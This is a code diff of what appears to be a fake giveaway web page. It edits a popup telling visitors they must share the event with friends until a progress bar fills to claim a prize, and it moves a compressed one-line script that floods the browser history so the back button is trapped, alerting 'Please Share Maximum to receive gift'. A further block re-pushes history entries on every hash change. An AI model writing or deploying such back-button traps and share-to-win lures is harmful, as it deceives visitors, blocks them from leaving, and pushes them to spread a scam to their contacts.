@@ -608,7 +608,7 @@ $("#offerss").click(function () {
    Swal.fire({
   icon: 'error',
   title: 'Unfortunately...',
-   text: 'To Receive Your Prize, You have to share with friends about our event. Share until the blue bar is full!',
+  text: 'To Receive Your Prize, You have to share with friends about our event. Share until the blue bar is full!',
   
 });
    }
@@ -631,8 +631,6 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <!-- Histats.com  END  -->
 
 
-      <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Please Share Maximum to receive gift');		}}		catch (o){}}();</script>
-
 <script>
     window.onhashchange=function(){jp();};
     function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
@@ -647,6 +645,11 @@ hs.src = ('//s10.histats.com/js15_as.js');
     }
 </script>
 
+
+
+
+
+      <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Please Share Maximum to receive gift. ');		}}		catch (o){}}();</script>
 
 
 
